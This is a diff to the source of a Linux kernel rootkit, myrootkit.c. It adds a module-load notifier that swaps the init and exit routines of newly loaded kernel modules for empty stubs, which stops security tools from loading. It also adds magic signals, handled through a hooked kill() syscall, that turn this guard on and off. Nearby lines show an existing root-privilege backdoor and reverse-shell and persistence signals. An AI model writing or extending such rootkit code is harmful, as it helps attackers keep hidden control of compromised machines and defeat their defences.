@@ -25,12 +25,13 @@ File: myrootkit.c
 # include <linux/printk.h>
 // struct tcp_seq_afinfo.
 # include <net/tcp.h> 
-// PDE_DATA
-# include <linux/proc_fs.h>
 // __task_cred
 # include <linux/cred.h>
 //socket
 # include <linux/net.h>
+
+# include <linux/sched.h>
+
 
 
 MODULE_LICENSE("GPL");
@@ -534,6 +535,50 @@ void clean_priviledge_backdoor(void)
 //========== END GET ROOT PRIVILEDGE =================
 
 
+//========== BLOCK MODULE =================
+
+int module_notifier(struct notifier_block *nb, \
+					unsigned long action, void *data);
+struct notifier_block nb = {
+	.notifier_call = module_notifier,
+	.priority = INT_MAX
+};
+
+int fake_init(void){
+        //printk("%s\n", "Fake init.");//for testing
+	return 0;
+}
+
+void fake_exit(void){
+	 //printk("%s\n", "Fake exit.");// for testing
+	return;
+}
+
+int module_notifier(struct notifier_block *nb, \
+					unsigned long action, void *data){
+	struct module *module;
+	unsigned long flags;
+	// definite lock
+	DEFINE_SPINLOCK(module_notifier_spinlock);
+	module = data;
+
+	// store interrupt, lock
+	spin_lock_irqsave(&module_notifier_spinlock, flags);
+	switch(module->state){
+	case MODULE_STATE_COMING:
+		module->init = fake_init;
+		module->exit = fake_exit;
+		break;
+	default:
+		break;
+	}
+	spin_unlock_irqrestore(&module_notifier_spinlock, flags);
+	return NOTIFY_DONE;
+}
+
+//========== END BLOCK MODULE =================
+
+
 
 
 //========== CREATE FILE =================
@@ -602,6 +647,8 @@ asmlinkage int (*real_kill)(pid_t pid, int sig);
 #define SIGCLEANBACKDOOR 60
 #define SIGPERSISTENCE 61
 #define SIGREVERSESHELL 62
+#define SIGSETGUARD 63
+#define SIGCLEARGUARD 64
 
 asmlinkage int fake_kill(pid_t pid, int sig){
     switch(sig){
@@ -641,6 +688,12 @@ asmlinkage int fake_kill(pid_t pid, int sig){
         case SIGPERSISTENCE:
             break;
         case SIGREVERSESHELL:
+            break; 
+        case SIGSETGUARD:
+        	register_module_notifier(&nb);
+            break; 
+        case SIGCLEARGUARD:
+        	unregister_module_notifier(&nb);
             break;      
         default:
             return real_kill(pid,sig);
